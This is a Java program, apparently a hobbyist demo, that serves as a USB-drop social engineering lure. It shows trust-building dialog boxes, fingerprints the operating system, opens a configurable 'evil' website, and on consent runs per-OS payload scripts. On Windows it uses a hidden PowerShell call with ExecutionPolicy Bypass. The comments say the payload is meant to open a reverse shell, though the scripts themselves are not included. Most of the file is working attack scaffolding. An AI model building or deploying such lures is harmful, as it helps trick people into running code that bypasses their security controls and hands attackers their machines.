/*******************************************************
 * IfFoundOpenMe
 * Author: TheGhostOfYankeeJim  
 * Description: This is an example program how one may 
 * construct a social engineering attack via a USB drive.
 * The way this program operates is it builds trust, 
 * finger prints the OS, based on OS performs a pay load.
 * The scripts I have created are non-malicious but show
 * that with some knowledge different scripts could be used 
 * to do some malicious actions. The reason I did not  
 * attach any real malicious scripts is its one thing to have a 
 * torpedo but its a completely different thing to have a
 * torpedo with a war head attached. 
 *******************************************************/


// This section imports all the required libraries 
import javax.swing.JOptionPane;
import java.io.*;
import java.net.URISyntaxException;


public class OpenMe

{
	//This is part of the finger printing of the OS
	private static String OS = System.getProperty("os.name").toLowerCase();
	
	
	// can change this to an attack site, or a site to increase trust to the user
	static String myEvilSite = "www.google.com"; 
	
	//Main Loop
	public static void main(String[] args) throws IOException, URISyntaxException //Eclipse told me to add this to get it to even run
	{	
		
		//This is used to check to make sure it's detecting, commented out in final
		// System.out.println(OS);
		
		// Web site and OS finger printing portion of the program
		// the buttons produce a 0,1,2 int values, based on the values the if statements will trigger
		int websiteResponse = JOptionPane.showConfirmDialog(null, "Would you like to view our website?");
		
		//if user clicks yes, check OS for website function 
		if (websiteResponse == 0)
			checkOSForWebsite();
		
		//this gives the user a chance to exit the software makes it feel more legit.
		if (websiteResponse == 2)
			System.exit(0);
		
		
		
		
		// Start of the malicious part
				
		int installProcess = JOptionPane.showConfirmDialog(null, "Would you like to run the LostAndFoundUSB functions?");
		/* The user will be given three options, yes, no, cancel. 
		 * Yes will used the detected OS and run the payload to
		 * create a reverse shell. The no option will close the
		 * program. Cancel will do the same.  
		 */
		
		
		//these are tests to see if everything is loading correctly
		// commented out in final program
		// System.out.println(websiteResponse);
		// System.out.println(installProcess);
		
		// if user clicked yes, start the malicious task
		if(installProcess == 0)
		{
			executeMaliciousTasks();
		}
		
		// if user clicks no or cancel, close to program
		if(installProcess == 1 || installProcess == 2)
		{
			System.exit(0); 
		}
		
	}
	
	
	// This method begins to check the OS again, if the OS is X then run scripts Y. 
	
	private static void executeMaliciousTasks() throws IOException 
	{	
		// if the OS name contains mac, it must be a mac
		if (OS.contains("mac"))
		{
			// this is a console test, will comment out in final product
			// System.out.println("Gotcha!");
			
			Process macProcess = Runtime.getRuntime().exec("src/testbash.sh");
			
			
		}
		
		// if the OS name contains Linux, must be linux
		if (OS.contains("linux"))
		{
			// this is a console test, will comment out in final product
			// System.out.println("Gotcha!");
			Process linuxProcces = Runtime.getRuntime().exec("src/testbash.sh");
			
		}
		
		
		if (OS.contains("windows"))
		{
			// this is a console test, will comment out in final product
			// System.out.println("Gotcha!");
			
			//String contains the actual commands to bypass executionPolicy and to run my scripts unchecked just for this session 
			String dropSecLevel = "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File src/pstest.ps1";
			Process powerShellProcess = Runtime.getRuntime().exec(dropSecLevel);
			
		}
	}

	// This method checks if the OS is Linux,Mac, Windows, and loads myEvilSite
	private static void checkOSForWebsite() throws IOException 
	{
		
		//checks to see if the system is a mac
		if(OS.contains("mac"))
		{	
			//this opens a runtime on a mac system to open the evil website
			Runtime macRT = Runtime.getRuntime();
			macRT.exec( "open" + myEvilSite);
		}
		
		//checks to see if the OS is windows
		if(OS.contains("win"))
		{
			//this opens a runtime on a win system to open the evil web site
			Runtime winRT = Runtime.getRuntime();
			winRT.exec( "rundll32 url.dll,FileProtocolHandler " + myEvilSite);
		}
		
		
		// Checks to see if the OS is Linux, uses default browser
		if(OS.contains("linux"))
		{
		
			Runtime linuxRT = Runtime.getRuntime();
			
			// you can add other web browsers, but all linux systems come with firefox so I focused on that
			String[] browsers = {"firefox", "mozilla"}; 

			StringBuffer linuxCommand = new StringBuffer();
				for (int i=0; i<browsers.length; i++)
					linuxCommand.append( (i==0  ? "" : " || " ) + browsers[i] +" \"" + myEvilSite + "\" ");
				linuxRT.exec(new String[] { "sh", "-c", linuxCommand.toString() });
		}
		
		
	}

}